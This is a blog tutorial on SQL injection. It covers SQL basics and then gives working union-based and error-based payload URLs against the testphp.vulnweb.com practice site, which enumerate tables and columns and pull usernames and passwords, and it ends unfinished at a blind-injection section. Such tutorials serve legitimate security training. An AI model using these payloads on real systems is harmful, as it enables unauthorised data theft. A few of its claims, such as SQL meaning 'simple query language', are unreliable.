---
layout: post
title: SQL Injection
date: 2021-10-13 12:00
image: '/assets/img/posts/fundamentals-of-sql-injection/sql2.jpg'
tags: [sql,sql-injection]
---
In this article you will learn SQL Injection fundamentals from 0 to hero.
<br>
In order to understand SQL injections, it is essential to observe those two concepts seperately.

## WHAT IS INJECTION ?
Injection refers to a broad variety of attack vectors. An attacker feeds the program with malicious input.
This input interpreted by the program and works for attacker's favour.This vulnerability occurs when the input is not controlled 
with meticulousness before or after input has taken.There are bunch of different kind of injections out there.
Examples are javascript ,ldap, xpath, host header, code, email header and crlf injections and SQL injection is one of them.
## WHAT IS SQL ?
SQL stands for **simple query language**. What it does is basically, managing data held in databases.
It is particularly useful in handling structured data. So whenever you ask for spesific part of data
you can request it in any order or concatanate it with different data held in different data table. 
There are bunch of different sql types, MySQL, SqLite, PostgreSQL, Microsoft SQL Server and etc. They are
actually more or less all the same except for the syntax diffrences between them.

### Understanding SQL
Let us examine the behavior of SQL codes by using [**sqliteonline**](https://www.sqliteonline.com)

![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql.jpg)
<br>

#### Why SQL ?
As you can see, there is a table consists of 3 columns and 21 rows.Those are basically **key** and **value** pairs.
In this spesific example `ID` is the **Key** value, `Name` and `Hint` are the **value**s which defined by that 
spesific 'ID' numer of **1**.However, as you can guess, it is not practical to summon whole data each 
time when we want to use or see one or couple parts of the data. In addition, we may want to combine different 
data parts together, so that is why we use SQL.

#### SQL Basics
Every table has its own name, and the name of the table above is **demo**.It is not needed to be an expert
SQL programmer, but you need to understand the principles of SQL programming, so let us start with some basics.

{% highlight sql %}
SELECT * FROM demo;
{% endhighlight %}
This command selects everything from demo table, fetches full content from the table.
You can see the output at the picture above. 
<br><br>
{% highlight sql %}
SELECT * FROM demo WHERE ID=3;
{% endhighlight %}
If you want to bring the informations related to 'ID' number of 3, you can add `WHERE` clause at the end of the query, and specify the filter.
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql3.jpg)
<br><br>
{% highlight sql %}
SELECT * FROM demo WHERE ID=3 UNION SELECT * FROM demo WHERE Name="Chart";
{% endhighlight %}
You can concatenate two different queries together by using 'UNION', however result of the
queries have to have same amount of columns, otherwise it will not work. In this example, there is
only one table called **demo**, so naturally all the selections will have 3 columns.If the result of the select queries of different
tables have different amount of columns, you can not `UNION` the result of the selections together.
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql4.jpg)
<br>
<br>
{% highlight sql %}
SELECT * FROM demo ORDER BY name ASC;
{% endhighlight %}
You can order the table with `ORDER BY` clause.You can either put column number with numerics, or column name
both `ASC` ascending and `DESC` descending order.
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql5.jpg)
<br><br>
{% highlight sql %}
SELECT table_name FROM INFORMATION_SCHEMA.TABLES ORDER BY 1 ASC;
{% endhighlight %}
See all the tables existing in the currently active database.
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql6.jpg)
<br><br>
{% highlight sql %}
SHOW DATABASES;
{% endhighlight %}
See all the created databases.
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql7.jpg)

### Summary
Understanding this much of SQL will do for now.In this section I wrote about basics of SQL, however in the following
sections I will be writing about tricks and tactics about SQL Injection, it is more imporant to understand very fundamentals
rather than complex queries.

## PRIMITIVES OF DATABASE LOGIC
From now on, you know how sql works, and the idea behind that. In this section, before moving on to the exploitation phase, 
you will learn bare-bones of **SQLi**, database logic and do some brainstorm. In this section I will be using **MariaDB**, it is community
developed database management system for MySQL.

### MariaDB/MySQL
I fired up my terminal and run my mariadb service. Without selecting any database or any table, I will run the following query.
Try to guess the result of it. 
{% highlight sql %}
MariaDB [(none)]> SELECT 1;
{% endhighlight %}
It returns
{% highlight sql %}
+---+
| 1 | #>>> This is the column name
+---+
| 1 | #>>> This is the value corresponds to that column.
+---+
{% endhighlight %}
Does not make too much sense right ? Let us move further.
<br>
<br>
{% highlight sql %}
MariaDB [(none)]> SELECT 2-1;
{% endhighlight %}
How do you think this will end up ?
{% highlight sql %}
+-----+
| 2-1 |
+-----+
|   1 |
+-----+
{% endhighlight %}
From now on, we know that we can do **mathematical operations** with integers in sql, this is huge.
<br>
<br>
{% highlight sql %}
MariaDB [(none)]> SELECT '2-1';
{% endhighlight %}
It is same as before except for the single quotes.
{% highlight sql %}
+-----+
| 2-1 |
+-----+
| 2-1 |
+-----+
{% endhighlight %}
This time what we see is returning of a string value. It is reasonable because single or double quotes
are used for strings.
<br>
<br>
{% highlight sql %}
MariaDB [(none)]> SELECT '2'-'1';
{% endhighlight %}
It is hard to predict what is going to happen this time right ? Let us see.
{% highlight sql %}
+---------+
| '2'-'1' |
+---------+
|       1 |
+---------+
{% endhighlight %} 
Database actually performed the same mathematical operation as before when we did `SELECT 2-1`. That is because just like you,
database's mind get confused too, so it came up with an idea that 'Oh wait, I can cast them into integers !'.Now we are one more
step closer to understand the primitive behaviour of how databases work actually.
<br>
<br>
{% highlight sql %}
MariaDB [(none)]> SELECT '2'+'a';
+---------+
| '2'+'a' |
+---------+
|       2 |
+---------+
{% endhighlight %}
Hmm, brains burning right ? It is simple really, just like before database converted string value to integer, however it could not convert
**a** to any integer, so it considered it as **0**.By having this knowledge you should guess the output of this query.
<br>
<br>
{% highlight sql %}
MariaDB [(none)]> SELECT 'b'+'a';
{% endhighlight %}
You predicted it ?
{% highlight sql %}
+---------+
| 'b'+'a' |
+---------+
|       0 |
+---------+
{% endhighlight %}
This time two non-convertible to integer values given into single quoutes, database performed **0+0** this time.
<br>
<br>
{% highlight sql %}
MariaDB[(none)]> SELECT '2' '1';
{% endhighlight %}
This time instead putting an operation sign between those strings, we will left it blank.
{% highlight sql %}
+----+
| 2  |
+----+
| 21 |
+----+
{% endhighlight %}
As you can see, strings had been concatanated. So `SELECT '2' '1'` and `concat('2','1')` do the same thing.
<br>
<br>
{% highlight sql %}
MariaDB[(none)]> SELECT '2' '1' 'a';
{% endhighlight %}
You should be able to guess this one.
{% highlight sql %}
+-----+
| 2   |
+-----+
| 21a |
+-----+
{% endhighlight %}
Yes you are right, still string concat.
<br>
<br>
{% highlight sql %}
MariaDB[(none)]> SELECT '2' '1' 'a'-1;
{% endhighlight %}
From now on we know that, `'a'-1` will result -1. So this time instead of string concat, it will substract
-1 from 21.
{% highlight sql %}
+---------------+
| '2' '1' 'a'-1 |
+---------------+
|            20 |
+---------------+
{% endhighlight %}
<br>
<br>
There are few operants that you need to know.<br>
`^`=XOR operator
`!`=NOT operator

### Discipline
We have discovered some primitive behaviours of the database. Now we need to understand
which discipline we need to adopt to find a sql injection. 

Lets say there is a back end code running at the server just like that.

PSEUDO CODE
{% highlight python %}
id=request.get('id')
query="SELECT * FROM news WHERE id ="+id
result = db.execute(query)

if result.size()>0:
    for i in result:
        print(i.title)
else:
    print("No news")
{% endhighlight %}
This is the pseudo code to illustrate possible setup working on a web server to bring html document.
However we do not have access to this backend code, so what we are trying to do is that, we need to observe
the behavior of the responds to see if there is an injection possiblity.

Now lets say there are two html pages, one for id '1', and one for id '2':

ID1
{% highlight html %}
<h1>This is html document for ID 1</h1>
{% endhighlight %}
ID2
{% highlight html %}
<h1>This is html document for ID 2</h1>
{% endhighlight %}

While we dont have access to backend code, we can modify url.
{% highlight html %}
www.xyz.com/?id=
{% endhighlight %}
As you can tell, we can bring one of those two html documents by passing related ID number to the `?id=` parameter.<br>
Right now all the behaviour we have learned should make sense. We can either make request for `?id=1` or `=id=2-1`, both
will bring the first html document which has ID1. 
#### Principles
- We need to determine an initial, referance point for our examination.
In this case, it is html document of ID1 which we trying to return.
- Try to access to the initial point with different methods.
In this case we forced database to make that 2-1 operation to get out initial point.
<br>

From now on, we broke the system, we have observed that, it is possible for us to manipulate the database with an unexcpected
behavior. Key point is that, you could return your referance point with avoiding expected behavior.<br><br>
The question is that, what now ? How we can turn this vulnerability to our favour ? <br>
In order to exploit this sql injection, we need to be able to run our own select query, however as you can tell it is not
possible to change the query while it is hardcoded at the backend, we only can modify the parameter of it. This is where `UNION` saves the day.
<br>
Instead of passing `1` or `2` or `2-1` into the `?id=` field, we can pass `1 UNION SELECT (rest of the query)`<br>
As you remember that is the code at the back end.
{% highlight python %}
query="SELECT * FROM news WHERE id ="+id
{% endhighlight %} 
`www.xyz.com/?id='1 UNION SELECT .....'` <br>
<br>Query will run this for http request above-> `SELECT * FROM news WHERE id=1 UNION SELECT (rest of the query)`
<br> However at this point of time, we have two problems.<br>
1-What I will select in my own query ? What will replace the ,I do not know anything about the database.<br>
2-`UNION` has its limitations, the number of columns that return for each query should match.<br>
It is time to do some real sql injection on a web page.

## VULNWEB - UNION SQLi
<http://test.php.vulnweb.com> is a vulnerable website for pentesting practice. Navigate to the web page.
### Remembering the principles
As we talked it about before, we have a principle that has two parts.
<br>
1-Determine your referance point
<br>
2-Find a way to get back to that referance point with unexpected behavior.
<br>

### Making sure of SQL injection's existence
Navigate to <http://testphp.vulnweb.com/listproducts.php?cat=1> <br>This will be our referance point.<br><br>
Than to <http://testphp.vulnweb.com/listproducts.php?cat=2> <br>As we see different cat id brings different items from table.<br><br>
Than go for <http://testphp.vulnweb.com/listproducts.php?cat=2-1> <br><br>We tried an unexpected behavior, and eventually returned to our referance point.
<br>Thus, now it is certain that this web site vulnerable to sql injection.
<br>And this is because there is no **input validation** in the source code that is running on server side
and anybody can pass whatever value they want in the input field, in this case in the `?id=` field.
<br>
### Guessing the design
If you observe the url, you can guess there is a table named `listproducts` and a column named `cat`.<br>
Backend code may work like that:<br>
{% highlight sql %}
SELECT (some unknown column names) FROM listproducts WHERE cat=
{% endhighlight %}
Of course those names are not the same like that
at the source code, so we still do not know any names from the database.
And of course it may not work like that, just like I said, it is guessing.
<br>
After observing the behavior of the test.php.vulnweb, this pseudo code seems appropriate.
{% highlight python %}
id=request.get('id')
query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
result = db.execute(query)

if result.size()>0:
    for i in result:
        print(i.title)
        print(i.img)
        print(i.description)
        print(i.author)
else:
    pass
{% endhighlight %}
### Finding the column count

As we talked before, after finding the vulnerability with `2-1`, it is crucial to run our own queries.<br>
`UNION` will be starting point for this example. However we need to
know how many columns there are.<br>The way to do that is enumerate: <br>`1 UNION SELECT 1` to `1 UNION SELECT 1....x`.
<br>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql10.jpg)
<br>
As you can see, when the number of columns are not match, this happens.
<br><br>To give you better understanding about this
I will demonstrate this on my local machine with a test table.
{% highlight sql %}

MariaDB [test]> SELECT * FROM users;
+----------+----------+-----------+
| PersonID | LastName | FirstName |
+----------+----------+-----------+
|        1 | Baris    | Burak     |
|        1 | Baris    | Burak     |
|        1 | Baris    | Burak     |
|        1 | Baris    | Burak     |
|        2 | Baris2   | Burak2    |
|        3 | Baris3   | Burak3    |
+----------+----------+-----------+

MariaDB [test]> SELECT * FROM users WHERE PErsonID=3;
+----------+----------+-----------+
| PersonID | LastName | FirstName |
+----------+----------+-----------+
|        3 | Baris3   | Burak3    |
+----------+----------+-----------+

MariaDB [test]> SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
MariaDB [test]> SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1,2;
ERROR 1222 (21000): The used SELECT statements have a different number of columns
MariaDB [test]> SELECT * FROM users WHERE PErsonID=3 UNION SELECT 1,2,3;
+----------+----------+-----------+
| PersonID | LastName | FirstName |
+----------+----------+-----------+
|        3 | Baris3   | Burak3    |
|        1 | 2        | 3         |
+----------+----------+-----------+

{% endhighlight %}
There are three columns for this table, `Person ID`, `LastName`, `FirstName`.It means the second query I will run after `UNION` should also
have three columns to create an appropriate table. It actually makes sense, because it would be weird to have a concatanated table 
with a blank column.
As you can see I am getting the same error as the error on website when the number of columns are not match.
<br>
<br>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql9.jpg)
<br>
After enumerating until 11, we finally returning to our referance point.Thus we can tell the table has 11 columns in total.
Scroll down to the bottom, you should see someting different.
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,,8,9,10,11>
<br>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql8.jpg)
<br>
There is one more entry right now. However we see 7, 2 and 9. It means that web application prints out the informations to the
html document that contained in second, seventh and nineth columns in the table.<br>
It means that we can run whatever we want in that areas to extract information from the database. For example lets run `version()`
helper function at second, seventh or nienth column to see version of the server that running the database.
<br>
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11>
<br>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql11.jpg)
<br>
After this point of time, all the helper functions are available for you.You can run the following to avoid first part of the
sql query to only see your own query by selecting something non existent from the database.
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=8217582175821%20UNION%20SELECT%201,version(),3,4,5,6,7,8,9,10,11>
### Extracting the table names
First thing to do is to gather all the table names exists in the database.For MySQl it is `information_schema` which provides
access to database metadata.We are going to use methods of that information_schema to enumerate the database. 
Even though helper function's syntax or names will vary database to database, there is always a functionality doing
the same thing with for different database.
<br>
{% highlight sql %}
MariaDB [testdb]> SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+------------+
| table_name |
+------------+
| users      |
+------------+
{% endhighlight %}
With `tables` method belongs to `information_schema`, we can query the table names.<br>
Now lets imply this method to the acuart database.
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema=database()>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql12.jpg)
<br>
Awesome, we got all the table names storing in the acurat db.
### Extracting the column names
Just like `tables`, there is also `columns` method belongs to `information_schema`.However, to use that target-spesific, first
we needed to see table names. Otherwise it will bring all the columns exists in the database, such a mess.
{% highlight sql %}
MariaDB [testdb]> SELECT column_name FROM information_schema.columns WHERE table_name='users';
+---------------------+
| column_name         |
+---------------------+
| PersonID            |
| LastName            |
| FirstName           |
| PersonID            |
| FirstName           |
| LastName            |
| USER                |
| CURRENT_CONNECTIONS |
| TOTAL_CONNECTIONS   |
+---------------------+
{% endhighlight %}
Now lets imply this method to the acuart database. 
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_name="users">
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql13.jpg)
<br>
We now have got all the column names in the 'users' table, 'uname' and 'pass' columns are intresting : )
<br>
### Extracting values from columns
After this point, our aim is certain, and simple. We need to get 'uname' and 'pass' fields in users table.
One simple query to get those values, for example just like this. 
{% highlight sql %}
MariaDB [testdb]> SELECT FirstName from users;
+-----------+
| FirstName |
+-----------+
| Burak     |
| Burak2    |
| Burak3    |
+-----------+
{% endhighlight %}
So lets imply this to acuart.
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,2,3,4,5,6,concat("Username:",uname, " Password:",pass),8,9,10,11 FROM users>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql14.jpg)
**Congrats !!** we got the username and password fields.
### Concat method
As you see above, I used concat for string formatting.Lets see how it is working from our example database.
{% highlight sql %}
MariaDB [testdb]> SELECT concat("FN:",FirstName, "  LN:",LastName) from users;
+-------------------------------------------+
| concat("FN:",FirstName, "  LN:",LastName) |
+-------------------------------------------+
| FN:Burak  LN:Baris                        |
| FN:Burak2  LN:Baris2                      |
| FN:Burak3  LN:Baris3                      |
+-------------------------------------------+
{% endhighlight %}
### Guess correction
As you remember, at the `Guessing the design` heading, we come up with a possible query that runs at the server
just by observing the behaviour of the web application. After doing more scans in the database, I see that, that guess
we made above, is kind of close to the real design.

<http://testphp.vulnweb.com/listproducts.php?cat=-00 UNION SELECT 1,pshort,3,4,5,6,title,img,(SELECT aname FROM artists WHERE artist_id=1),10,(SELECT cname FROM categ WHERE cat_id=1) FROM pictures WHERE cat_id=1>
<br>
Gives the same result as:
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=1>

## VULNWEB - ERROR BASED SQLi

As you remember, this is the pseudo code for testphp.vulnweb website.

{% highlight python %}
id=request.get('id')
query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
#Try:
result = db.execute(query)
#Except:
    #pass

if result.size()>0:
    for i in result:
        print(i.title)
        print(i.img)
        print(i.description)
        print(i.author)
else:
    pass
{% endhighlight %}
I have added those comment lines intentionally.If we had those `Try` and `Except` lines, or any other exception handling method
with another language that is used in the server side code, we could not have see this error message.
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/15.jpg)
<br>
Spesifically speaking for the pseudo code above, when `execute(query)` method returns a result to the `result` variable from database. `if result.size()>0` means that, if we have returned something from query, print it,
it can be both the intented and expected query result, or in this case an error message. If we had an exception handling, result
variable would not be declared at all if the query result is not accurate.
<br>
This is a **catastrophic mis-coding** for the server, because we can use this error message to extract data from it.
<br>
### Extract value method

As in the example, database return the unexpected string in error message. That means that, we see what we give in the input
field.Instead of seeing what we give as a string, it is possible that to return values from database.<br>
There is a helper function that we can use, which is `ExtractValue()`.

<http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,database()))>
<br>
Query will look like this on the server side.
{% highlight python %}
SELECT (some unknown column names) FROM listproducts WHERE cat=extractvalue(rand(),concat(1,database()))
{% endhighlight %}
<br>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql16.jpg)
<br>
This time we have returned a function result as an error message and modified the function as we wanted.
<br>
As you can see from the picure, result of the `database()` helper function **acuart** is in the error message.
### Extract value with subquery
Instead of passing `database()` function as a second argument for `ExtractValue()` method, creating subquery with `()` will
allow you to write your own queries.
<br>
**I am assuming that you read the previous chapters and got the table names already for this example.**
<br>
<http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT concat(%22Username: %22,uname,%22  Password:%22,pass) FROM users)))>
<br>
![Desktop View](/assets/img/posts/fundamentals-of-sql-injection/sql17.jpg)
<br>


## (1' and 1=1 #) AND (1 ' or 1=1 #)

We have figured out the existence of the SQLi with **2-1**.However this due to the fact that, the code at the backend is
written in this syntax:
{% highlight python %}
query="SELECT * FROM news WHERE id ="+id
{% endhighlight %}
When we make a request to the `www.xyz.com/?id=2-1`, the server side code interpret and runs query like this:
{% highlight sql %}
SELECT * FROM news WHERE id = 2-1
--Which returns
+-----+
| 2-1 |
+-----+
|   1 |
+-----+
{% endhighlight %}

However the code could have  written like this either:
{% highlight python %}
id=request.get('id')
query="SELECT (some unknown column names) FROM listproducts WHERE cat ='" + id + "'"
#OR
id=request.get('id')
query=f"SELECT (some unknown column names) FROM listproducts WHERE cat  ='{id}'"
{% endhighlight %}
When this is the case, if you pass **2-1** to the parameter and make the same `www.xyz.com/?id=2-1` request,
the query would interpreted like the following, because string formatting is different in this case. As 
we discussed, both `'1'` and `1` parameters passed to the query will return the same result but `'2-1'` will not.
{% highlight sql %}
SELECT * FROM news WHERE id = '2-1'
--Which returns
+-----+
| 2-1 |
+-----+
| 2-1 |
+-----+
{% endhighlight %}
When this is the case, we need to escape those single quotes which are surrounding the parameter in order to make our own operations
on the database. 
<br>
This is where we need to use those `'or 1=1 #` or `'and 1=1 #`.

**Let me remind you the discipline we should follow**
<br>
1-Declare a reference point
<br>
2-Try to get back there with an unexpected behavior
<br>
Lets use `' and 1=1 #` to make the request like this `www.xyz.com/?id=1' and1=1 #`.

{% highlight python %}
query=f"SELECT * FROM news WHERE id ='{1' and 1=1 #}'"
{% endhighlight %}
{% highlight sql %}
SELECT - FROM new WHERE id = '1' and 1=1
{% endhighlight %}
This will bring entries which have id of **1**, and means that web application vulnerable to SQLi, from now on you can do everything same as before
to extract data the database.

## VULNWEB - BLIND SQLi

As you remember this was the pseudo code for testphp.vulnweb.
{% highlight python %}
id=request.get('id')
query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
result = db.execute(query)

if result.size()>0:
    for i in result:
        print(i.title)
        print(i.img)
        print(i.description)
        print(i.author)
else:
    pass
{% endhighlight %}
Lets make some changes to think what would have happened if source code for testphp.vulnweb would be like following.

{% highlight python %}
id=request.get('id')
query="SELECT (some unknown column names) FROM listproducts WHERE cat="+id
try:
    result = db.execute(query)
except:
    print("Error !!!")

if result.size()>0:
    #for i in result:
    #    print(i.title)
    #    print(i.img)
    #    print(i.description)
    #    print(i.author)
    print("Query succesfull !")
else:
    pass
{% endhighlight %}
If this was the case, we could not see any result of the query on the screen, neither
images nor titles etc. Also can not perform error based sqli due to exception handling added.How we can extract any data, even make sure there is a sql injection vulnerability when our eyes are blind ?
<br>
<br>
<br>
To be continued
